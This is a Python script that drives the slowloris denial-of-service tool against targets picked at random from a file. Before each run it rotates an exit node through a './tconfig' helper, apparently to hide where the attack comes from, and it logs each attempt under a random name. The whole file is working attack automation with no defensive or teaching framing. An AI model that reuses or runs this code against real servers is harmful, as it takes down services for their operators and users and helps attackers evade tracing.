import random
import sys
import subprocess
import time
import random
import string
import os

import logging
from logging.handlers import RotatingFileHandler

NAME = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

logger = logging.getLogger(NAME)
logger.setLevel(logging.DEBUG)
handler = RotatingFileHandler(
    f'logs/{NAME}.log',
    maxBytes=2**10,
    backupCount=1,
    )
logger.addHandler(handler)

try:
    TIMEOUT = int(sys.argv[1])
except IndexError:
    TIMEOUT = 300

with open('./targets.txt', mode='r') as file:
    targets = file.read().split('\n')

while True:
    target = random.choice(targets)
    logger.info('-' * 78)
    logger.info("Targeting: " + target)
    timeout = int(TIMEOUT + ((random.random() * 2) - 1) * TIMEOUT / 2)
    exitnode = os.popen('./tconfig').read().strip()
    logger.info("Exit node: " + exitnode)
    try:
        completed = subprocess.run(
            ['slowloris', target],
            capture_output=True,
            timeout=timeout,
            )
        logger.info("Completed:")
        logger.info(completed)
    except subprocess.TimeoutExpired as timeout:
        logger.info("Timed out:")
        logger.info(timeout.stderr)
    except Exception as exc:
        logger.info("Something went wrong:")
        logger.info(exc)
    logger.info("Repeating...")
    time.sleep(random.random())
    break
